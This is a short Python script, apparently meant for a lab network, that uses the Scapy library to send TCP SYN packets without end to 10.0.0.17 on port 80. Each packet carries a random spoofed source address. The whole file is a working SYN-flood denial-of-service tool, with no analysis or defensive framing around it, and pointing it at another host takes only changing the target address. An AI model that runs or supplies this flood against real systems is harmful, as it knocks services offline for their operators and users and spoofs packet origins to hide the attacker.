from scapy.all import *
from scapy.layers.inet import *


def flood():
    target_ip = "10.0.0.17"
    target_port = 80
    ip = IP(src=RandIP("10.0.0.1/24"), dst=target_ip)
    tcp = TCP(sport=80, dport=target_port, flags="S", seq=RandShort())
    p = ip / tcp
    send(p, count=1, verbose=0)

    return


while True:
    flood()
